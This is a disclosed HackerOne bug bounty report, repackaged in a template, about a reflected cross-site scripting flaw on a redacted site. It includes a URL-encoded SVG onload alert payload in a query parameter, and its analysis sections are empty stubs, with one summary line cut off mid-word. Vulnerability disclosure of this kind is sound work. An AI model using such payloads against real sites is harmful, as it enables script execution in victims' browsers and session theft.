# Reflected XSS on https://█████████/

## Metadata
- **Source:** HackerOne
- **Report:** 1065167 | https://hackerone.com/reports/1065167
- **Submitted:** 2020-12-23
- **Reporter:** nagli
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** None
- **Category:** web-api

## Summary
##Vulnerable Website URL or Application:
```javascript
https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

##Description of Security Issue: (please limit to one site/app per submission)

Reflected XSS due to no input validation

██████████

##Steps needed to reproduce bug:
Navigate to
```javascript
https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```
Choose wh

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

##Vulnerable Website URL or Application:
```javascript
https://███████/███████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```

##Description of Security Issue: (please limit to one site/app per submission)

Reflected XSS due to no input validation

██████████

##Steps needed to reproduce bug:
Navigate to
```javascript
https://███████/█████████=%22%3E%3Csvg/onload=alert(%22nagli%22)%3E
```
Choose whatever javascript you'd like to execute on the sub_div_ofc_sym_cd query parameter

##Remediation
Sanitize the input on the that parameter

##Best Regards
nagli

## Impact

Executing Javascript on behalf of the victim

</details>

---
*Analysed by Claude on 2026-05-24*
